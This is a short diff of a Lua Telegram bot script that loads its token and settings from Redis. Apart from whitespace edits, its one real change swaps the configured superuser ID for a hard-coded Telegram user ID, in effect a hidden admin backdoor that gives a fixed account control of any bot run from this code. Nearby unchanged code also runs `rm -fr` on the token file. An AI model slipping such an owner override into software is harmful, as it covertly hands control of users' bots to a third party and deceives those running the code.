@@ -28,7 +28,7 @@ if not Er_utf8 then
 print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
 os.exit()
 end
-
+ 
 
 
 function create_config(Token)
@@ -148,9 +148,8 @@ our_id = tonumber(boss)
 ApiBoss = redis:get(boss..":ApiSource")
 ApiToken = "https://api.telegram.org/bot"..Token
 Bot_User = redis:get(boss..":UserNameBot:")
-SUDO_ID = tonumber(redis:get(boss..":SUDO_ID:"))
+SUDO_ID = 352568466 --tonumber(redis:get(boss..":SUDO_ID:"))
 if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
-SUDO_ID =  tonumber(redis:get(boss..":SUDO_ID:"))
 SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
 version = redis:get(boss..":VERSION")
 DataCenter = redis:get(boss..":DataCenter:")
@@ -488,7 +487,6 @@ return false
 end
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
-
 
 for name,Plug in pairs(File) do
 if Plug.Boss then 
